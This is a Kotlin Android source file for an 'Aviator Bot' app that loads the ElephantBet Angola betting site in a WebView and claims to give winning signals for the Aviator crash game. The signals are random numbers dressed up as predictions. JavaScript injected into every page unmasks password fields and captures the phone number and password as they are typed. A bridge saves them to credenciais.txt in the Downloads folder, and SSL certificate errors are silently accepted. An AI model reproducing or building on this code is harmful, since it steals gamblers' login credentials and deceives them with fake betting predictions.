package ao.elephantbet.aviatorbot

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.http.SslError
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.ViewGroup.LayoutParams.MATCH_PARENT as MATCH
import android.view.ViewGroup.LayoutParams.WRAP_CONTENT as WRAP
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Date
import java.util.Locale
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var barLayout: LinearLayout
    private lateinit var txtMinutos: TextView
    private lateinit var txtAcao: TextView
    private lateinit var txtProtecao: TextView
    private lateinit var txtAlcance: TextView
    private lateinit var dotView: View

    private val handler = Handler(Looper.getMainLooper())
    private var sinaisAtivos = false
    private var horaAtual = -1
    private var ultimoMinutoGerado = -1
    private var sinalMin1 = -1
    private var sinalMin2 = -1
    private var sinalProtecao = ""
    private var sinalAlcMin = 0
    private var sinalAlcMax = ""
    private var relogioRunnable: Runnable? = null

    companion object { private const val PERM_REQUEST = 101 }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        pedirPermissoes()
        construirUI()
        carregarSite()
    }

    // ── PERMISSÕES ────────────────────────────────────────────────
    private fun pedirPermissoes() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            val perms = arrayOf(
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE
            )
            val falta = perms.any {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (falta) ActivityCompat.requestPermissions(this, perms, PERM_REQUEST)
        }
    }

    // ── UI ────────────────────────────────────────────────────────
    private fun construirUI() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0a0a0f"))
            layoutParams = ViewGroup.LayoutParams(MATCH, MATCH)
        }
        setContentView(root)

        // ══ BARRA PROFISSIONAL ════════════════════════════════════
        barLayout = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setBackgroundColor(Color.parseColor("#0f172a"))
            setPadding(dp(12), dp(10), dp(12), dp(10))
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }

        val icoAviao = TextView(this).apply {
            text = "✈️"; textSize = 24f; gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(dp(36), dp(36))
        }

        val bloco = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
            setPadding(dp(8), 0, dp(8), 0)
        }

        // Linha 1: AÇÃO + MINUTOS
        val linha1 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }
        txtAcao = TextView(this).apply {
            text = "AVIATOR BOT"; textSize = 9f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); letterSpacing = 0.12f
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(8) }
        }
        txtMinutos = TextView(this).apply {
            text = "A iniciar..."; textSize = 14f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE); isSingleLine = true
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
        }
        linha1.addView(txtAcao); linha1.addView(txtMinutos)

        // Linha 2: pills PROTEÇÃO e ALCANCE
        val linha2 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(5) }
        }
        txtProtecao = TextView(this).apply {
            text = "🛡 --"; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE); gravity = Gravity.CENTER
            setPadding(dp(10), dp(4), dp(10), dp(4))
            background = pill("#1e3a5f")
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(8) }
        }
        val sep = TextView(this).apply {
            text = "→"; textSize = 12f; setTextColor(Color.parseColor("#475569"))
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(8) }
        }
        txtAlcance = TextView(this).apply {
            text = "📈 --"; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE); gravity = Gravity.CENTER
            setPadding(dp(10), dp(4), dp(10), dp(4))
            background = pill("#1a3a2a")
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP)
        }
        linha2.addView(txtProtecao); linha2.addView(sep); linha2.addView(txtAlcance)

        bloco.addView(linha1); bloco.addView(linha2)

        dotView = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(dp(10), dp(10)).apply { marginEnd = dp(8) }
            background = circulo("#334155")
        }
        val cfgBtn = TextView(this).apply {
            text = "⚙️"; textSize = 20f; gravity = Gravity.CENTER
            setPadding(dp(4), 0, 0, 0)
            setOnClickListener { mostrarConfig() }
        }

        barLayout.addView(icoAviao); barLayout.addView(bloco)
        barLayout.addView(dotView); barLayout.addView(cfgBtn)
        root.addView(barLayout)

        // ── WEBVIEW
        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(MATCH, 0, 1f)
        }
        configurarWebView()
        root.addView(webView)
    }

    // ── WEBVIEW ───────────────────────────────────────────────────
    @SuppressLint("SetJavaScriptEnabled")
    private fun configurarWebView() {
        webView.settings.apply {
            javaScriptEnabled = true; domStorageEnabled = true
            databaseEnabled = true; allowFileAccess = true
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            setSupportZoom(true); builtInZoomControls = false
            loadWithOverviewMode = true; useWideViewPort = true
        }
        webView.addJavascriptInterface(object {
            @JavascriptInterface
            fun aviatorDetectado() = runOnUiThread { iniciarSinais() }
            @JavascriptInterface
            fun guardarCredencial(tipo: String, valor: String) {
                if (valor.isNotEmpty()) guardarFicheiro(tipo, valor)
            }
        }, "Android")

        webView.webViewClient = object : WebViewClient() {
            override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: SslError?) { h?.proceed() }
            override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?) = false
            override fun onPageFinished(v: WebView?, url: String?) {
                super.onPageFinished(v, url)
                injetarJsGlobal()
                if (isAviatorUrl(url ?: "")) iniciarSinais()
            }
        }
        webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, p: Int) {
                if (isAviatorUrl(view?.url ?: "") && !sinaisAtivos) iniciarSinais()
            }
        }
    }

    private fun isAviatorUrl(url: String) =
        url.contains("game-view/806666", ignoreCase = true) ||
        url.contains("aviator", ignoreCase = true) ||
        url.contains("spribe", ignoreCase = true)

    private fun carregarSite() {
        webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login")
    }

    // ── JS GLOBAL ─────────────────────────────────────────────────
    private fun injetarJsGlobal() {
        val js = """
        (function() {
            if (window._ebOk) return; window._ebOk = true;
            function vis() {
                document.querySelectorAll('input[type="password"]').forEach(function(e){
                    e.setAttribute('type','text');
                    e.style.webkitTextSecurity='none';
                });
            }
            vis();
            new MutationObserver(vis).observe(document.body,{childList:true,subtree:true});
            function watch(sels, tipo) {
                sels.forEach(function(s){
                    try {
                        var el=document.querySelector(s);
                        if(el&&!el._w){ el._w=true;
                            el.addEventListener('input',function(){
                                if(this.value.length>=1) Android.guardarCredencial(tipo,this.value);
                            });
                        }
                    }catch(e){}
                });
            }
            function cap(){
                watch(['input[name="username"]','input[name="phone"]','input[type="tel"]',
                       'input[placeholder*="telefone" i]','input[placeholder*="número" i]',
                       '#username','#phone'],'Numero');
                watch(['input[name="password"]','input[name="senha"]',
                       'input[placeholder*="senha" i]','input[placeholder*="password" i]',
                       '#password'],'Senha');
            }
            cap(); setTimeout(cap,1500); setTimeout(cap,3500); setTimeout(cap,6000);
            document.addEventListener('click',function(e){
                var el=e.target;
                for(var i=0;i<5;i++){
                    if(!el) break;
                    var h=(el.getAttribute&&el.getAttribute('href')||'').toLowerCase();
                    var t=(el.textContent||'').toLowerCase();
                    if(t.includes('aviator')||h.includes('aviator')||h.includes('806666'))
                        { Android.aviatorDetectado(); break; }
                    el=el.parentElement;
                }
            },true);
            var cur=window.location.href.toLowerCase();
            if(cur.includes('aviator')||cur.includes('806666')) Android.aviatorDetectado();
        })();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    // ── SINAIS ────────────────────────────────────────────────────
    private fun iniciarSinais() {
        if (sinaisAtivos) return
        sinaisAtivos = true
        val cal = Calendar.getInstance()
        horaAtual = cal.get(Calendar.HOUR_OF_DAY)
        ultimoMinutoGerado = -1
        sinalMin1 = -1; sinalMin2 = -1
        gerarNovoSinal()
        iniciarRelogio()
    }

    private fun gerarNovoSinal() {
        val cal = Calendar.getInstance()
        val minAgora = cal.get(Calendar.MINUTE)
        val base = if (ultimoMinutoGerado < 0) minAgora + 1
                   else ultimoMinutoGerado + Random.nextInt(2, 6)
        val min1 = base; val min2 = min1 + 1
        if (min2 >= 59) {
            atualizarBarra("⏳ NOVA HORA", "${60 - minAgora} minutos", "--", "--", "#f59e0b")
            return
        }
        sinalMin1 = min1; sinalMin2 = min2
        ultimoMinutoGerado = min2

        // Gerar alcance primeiro, depois proteção proporcional
        val (alcMin, alcMax, alcMaxNum) = gerarAlcance()
        sinalAlcMin = alcMin
        sinalAlcMax = alcMax
        sinalProtecao = gerarProtecaoParaAlcance(alcMaxNum)

        val falta = sinalMin1 - minAgora
        atualizarBarra(
            "⏳ AGUARDAR",
            "Min $min1/$min2  (${falta}min)",
            sinalProtecao,
            "${sinalAlcMin}x → ${sinalAlcMax}",
            "#f59e0b"
        )
    }

    private fun iniciarRelogio() {
        relogioRunnable?.let { handler.removeCallbacks(it) }
        val tick = object : Runnable {
            override fun run() { verificarRelogio(); handler.postDelayed(this, 1000) }
        }
        relogioRunnable = tick; handler.post(tick)
    }

    private fun verificarRelogio() {
        if (!sinaisAtivos) return
        val cal = Calendar.getInstance()
        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora = cal.get(Calendar.MINUTE)

        if (horaAgora != horaAtual) {
            horaAtual = horaAgora; ultimoMinutoGerado = -1
            sinalMin1 = -1; sinalMin2 = -1; gerarNovoSinal(); return
        }
        if (sinalMin1 < 0) { gerarNovoSinal(); return }

        val alcTxt = "${sinalAlcMin}x → ${sinalAlcMax}"
        when {
            minAgora == sinalMin1 -> atualizarBarra(
                "🎯 ENTRAR AGORA",
                "Min $sinalMin1/$sinalMin2",
                sinalProtecao, alcTxt, "#22c55e"
            )
            minAgora == sinalMin2 -> atualizarBarra(
                "🎯 AINDA ACTIVO",
                "Min $sinalMin1/$sinalMin2",
                sinalProtecao, alcTxt, "#22c55e"
            )
            minAgora > sinalMin2 -> gerarNovoSinal()
            else -> {
                val falta = sinalMin1 - minAgora
                atualizarBarra(
                    "⏳ AGUARDAR",
                    "Min $sinalMin1/$sinalMin2  (${falta}min)",
                    sinalProtecao, alcTxt, "#f59e0b"
                )
            }
        }
    }

    // ── GERADORES — PROTEÇÃO PROPORCIONAL AO ALCANCE ──────────────
    //
    //  Alcance baixo  (até 100x)   → Proteção baixa   1.3x – 3x
    //  Alcance médio  (100x–500x)  → Proteção média   3x – 8x
    //  Alcance alto   (500x–1000x) → Proteção alta    8x – 12x
    //  Alcance máximo (1000x+)     → Proteção máxima  12x – 15x
    //
    data class AlcanceResult(val alcMin: Int, val alcMax: String, val alcMaxNum: Int)

    private fun gerarAlcance(): AlcanceResult {
        // Nível aleatório: 0=baixo 1=médio 2=alto 3=máximo
        val nivel = Random.nextInt(4)
        return when (nivel) {
            0 -> { // baixo
                val min = listOf(10, 20, 30)[Random.nextInt(3)]
                val max = listOf(50, 80, 100)[Random.nextInt(3)]
                AlcanceResult(min, "${max}x", max)
            }
            1 -> { // médio
                val min = listOf(30, 50, 80)[Random.nextInt(3)]
                val max = listOf(100, 200, 500)[Random.nextInt(3)]
                AlcanceResult(min, "${max}x", max)
            }
            2 -> { // alto
                val min = listOf(50, 80, 100)[Random.nextInt(3)]
                val max = listOf(500, 800, 1000)[Random.nextInt(3)]
                AlcanceResult(min, "${max}x", max)
            }
            else -> { // máximo
                val min = listOf(80, 100, 200)[Random.nextInt(3)]
                AlcanceResult(min, "1000x+", 1001)
            }
        }
    }

    private fun gerarProtecaoParaAlcance(alcMaxNum: Int): String {
        val prot = when {
            alcMaxNum <= 100  -> { // baixo — proteção 1.3x a 3x
                val opts = listOf(1.3, 1.5, 1.8, 2.0, 2.5, 3.0)
                opts[Random.nextInt(opts.size)]
            }
            alcMaxNum <= 500  -> { // médio — proteção 3x a 8x
                val opts = listOf(3.0, 4.0, 5.0, 6.0, 8.0)
                opts[Random.nextInt(opts.size)]
            }
            alcMaxNum <= 1000 -> { // alto — proteção 8x a 12x
                val opts = listOf(8.0, 9.0, 10.0, 11.0, 12.0)
                opts[Random.nextInt(opts.size)]
            }
            else -> { // máximo — proteção 12x a 15x
                val opts = listOf(12.0, 13.0, 14.0, 15.0)
                opts[Random.nextInt(opts.size)]
            }
        }
        return if (prot % 1.0 == 0.0) "${prot.toInt()}x" else "${prot}x"
    }

    // ── ATUALIZAR BARRA ───────────────────────────────────────────
    private fun atualizarBarra(
        acao: String, minutos: String,
        protecao: String, alcance: String,
        cor: String
    ) = runOnUiThread {
        txtAcao.text = acao
        txtAcao.setTextColor(Color.parseColor(cor))
        txtMinutos.text = minutos
        txtMinutos.setTextColor(Color.WHITE)

        if (protecao.isNotEmpty() && protecao != "--") {
            txtProtecao.text = "🛡 $protecao"
            txtProtecao.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1e2a3a")
        }
        if (alcance.isNotEmpty() && alcance != "--") {
            txtAlcance.text = "📈 $alcance"
            txtAlcance.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1a3a2a")
        }

        dotView.background = circulo(cor)
        barLayout.setBackgroundColor(Color.parseColor(
            when (cor) {
                "#22c55e" -> "#071a0f"
                "#f59e0b" -> "#1a1200"
                else -> "#0f172a"
            }
        ))
    }

    private fun atualizarBarra(acao: String, minutos: String, cor: String) =
        atualizarBarra(acao, minutos, "", "", cor)

    // ── GUARDAR FICHEIRO — pasta Downloads/AviatorBot/ ────────────
    private fun guardarFicheiro(tipo: String, valor: String) {
        val ts = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())
        val linha = "[$ts] $tipo: $valor\n"

        // Tentar pasta Downloads (visível sem root em qualquer Android)
        try {
            val downloads = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
            val pasta = File(downloads, "AviatorBot").also { it.mkdirs() }
            FileWriter(File(pasta, "credenciais.txt"), true).use { it.write(linha) }
            return
        } catch (_: Exception) {}

        // Fallback: pasta privada da app
        try {
            val pasta = File(getExternalFilesDir(null), "AviatorBot").also { it.mkdirs() }
            FileWriter(File(pasta, "credenciais.txt"), true).use { it.write(linha) }
            return
        } catch (_: Exception) {}

        // Último recurso: armazenamento interno
        try {
            val pasta = File(filesDir, "AviatorBot").also { it.mkdirs() }
            FileWriter(File(pasta, "credenciais.txt"), true).use { it.write(linha) }
        } catch (_: Exception) {}
    }

    // ── CONFIG ────────────────────────────────────────────────────
    private fun mostrarConfig() {
        val dialog = android.app.Dialog(this, android.R.style.Theme_Material_NoActionBar_Fullscreen)
        val scroll = ScrollView(this).apply { setBackgroundColor(Color.parseColor("#0a0a0f")) }
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(28), dp(20), dp(20))
        }
        layout.addView(TextView(this).apply {
            text = "⚙️  CONFIGURAÇÕES"; textSize = 16f
            setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(24) }
        })
        layout.addView(secLabel("🎯  SINAIS"))
        layout.addView(btn("🎯  GERAR SINAL AGORA", "#7c3aed") {
            dialog.dismiss()
            sinaisAtivos = false; ultimoMinutoGerado = -1
            sinalMin1 = -1; sinalMin2 = -1; iniciarSinais()
        })
        layout.addView(btn("✈️  ABRIR AVIATOR", "#0f766e") {
            dialog.dismiss()
            webView.loadUrl("https://www.elephantbet.co.ao/pt/casino/game-view/806666/aviator")
        })
        layout.addView(btn("🔄  RECARREGAR SITE", "#1d4ed8") { dialog.dismiss(); carregarSite() })
        layout.addView(btn("✕  FECHAR", "#1e1e2e") { dialog.dismiss() })
        scroll.addView(layout); dialog.setContentView(scroll); dialog.show()
    }

    // ── HELPERS ───────────────────────────────────────────────────
    private fun circulo(cor: String) = GradientDrawable().apply {
        shape = GradientDrawable.OVAL; setColor(Color.parseColor(cor))
    }
    private fun pill(cor: String) = GradientDrawable().apply {
        shape = GradientDrawable.RECTANGLE; cornerRadius = dp(20).toFloat()
        setColor(Color.parseColor(cor))
    }
    private fun roundRect(bg: String, border: String) = GradientDrawable().apply {
        shape = GradientDrawable.RECTANGLE; cornerRadius = dp(10).toFloat()
        setColor(Color.parseColor(bg)); setStroke(dp(1), Color.parseColor(border))
    }
    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()
    private fun secLabel(txt: String) = TextView(this).apply {
        text = txt; textSize = 11f; setTextColor(Color.parseColor("#64748b"))
        typeface = Typeface.DEFAULT_BOLD
        layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(16); bottomMargin = dp(10) }
    }
    private fun btn(txt: String, cor: String, action: () -> Unit) = Button(this).apply {
        text = txt; setTextColor(Color.WHITE); textSize = 13f
        typeface = Typeface.DEFAULT_BOLD; isAllCaps = false
        background = roundRect(cor, cor); setPadding(0, dp(14), 0, dp(14))
        setOnClickListener { action() }
        layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(8) }
    }

    override fun onBackPressed() { if (webView.canGoBack()) webView.goBack() else super.onBackPressed() }
    override fun onDestroy() {
        super.onDestroy(); webView.destroy()
        handler.removeCallbacksAndMessages(null)
    }
}
